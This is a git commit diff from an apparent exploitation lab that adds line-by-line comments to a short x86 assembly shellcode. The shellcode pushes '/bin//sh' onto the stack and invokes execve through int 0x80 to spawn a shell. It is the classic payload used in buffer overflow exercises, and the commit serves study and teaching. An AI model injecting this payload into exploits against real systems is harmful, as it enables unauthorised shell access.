b967110ea12a5c5151bc7b4760078e9a80b8f1ce
muammar <muammararif007@gmail.com>
2020-03-11 13:59:48 +0530

    shellcode: add comments

--- lab_02_shellcode/shell2.asm
+++ lab_02_shellcode/shell2.asm
@@ -2,11 +2,11 @@ section .text
   global _start
 
 _start:
-  xor eax, eax
-  push eax
-  push 0x68732f2f
-  push 0x6e69622f
-  mov ebx, esp
-  mov ecx, eax
-  mov al, 0xb
-  int 0x80
+  xor eax, eax     ; set eax to 0
+  push eax         ; push 0 `\x00` to stack![](img/test_str_1.png)
+  push 0x68732f2f  ; push `hs//`
+  push 0x6e69622f  ; push `nib/`
+  mov ebx, esp     ; move the string to ebx
+  mov ecx, eax     ; set ecx as 0
+  mov al, 0xb      ; set eax as 0xb
+  int 0x80         ; execute the syscall
